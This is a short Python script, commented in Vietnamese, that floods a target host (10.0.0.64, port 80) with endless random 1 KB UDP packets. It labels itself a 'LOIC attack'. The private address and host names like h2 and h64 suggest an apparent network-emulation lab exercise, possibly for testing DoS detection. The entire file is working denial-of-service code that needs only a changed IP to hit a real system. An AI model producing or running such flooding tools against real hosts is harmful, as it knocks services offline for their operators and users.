import socket
import sys
import time
import random
import os

# Cấu hình mục tiêu tấn công (IP của Server h64)
TARGET_IP = '10.0.0.64'
TARGET_PORT = 80 # Cổng Web

def attack():
    # Tạo Socket UDP (SOCK_DGRAM). UDP không cần bắt tay 3 bước nên gửi cực nhanh
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Tạo một gói tin rác ngẫu nhiên kích thước 1KB (1024 bytes)
    bytes_data = random._urandom(1024)
    
    # Lấy tên máy đang chạy (ví dụ h2) để in ra màn hình
    hostname = os.popen('hostname').read().strip()
    print(f"\n[!!!] {hostname} STARTING LOIC ATTACK (UDP FLOOD) -> {TARGET_IP}")
    
    count = 0
    try:
        # Vòng lặp vô tận (Gửi mãi mãi cho đến khi bấm Ctrl+C)
        while True:
            # Gửi gói tin rác đến đích
            sock.sendto(bytes_data, (TARGET_IP, TARGET_PORT))
            count += 1
            
            # Cứ mỗi 5000 gói thì in thông báo một lần để đỡ lag màn hình
            if count % 5000 == 0:
                sys.stdout.write(f"\r--> Sent: {count} packets")
                sys.stdout.flush()
            
            # Nghỉ cực ngắn (0.0001s) để CPU không bị treo, nhưng vẫn đủ nhanh để nghẽn mạng
            time.sleep(0.0001)
    except KeyboardInterrupt:
        # Xử lý khi người dùng bấm Ctrl+C để dừng
        print(f"\n[X] Stopped. Total: {count}")

if __name__ == '__main__':
    attack()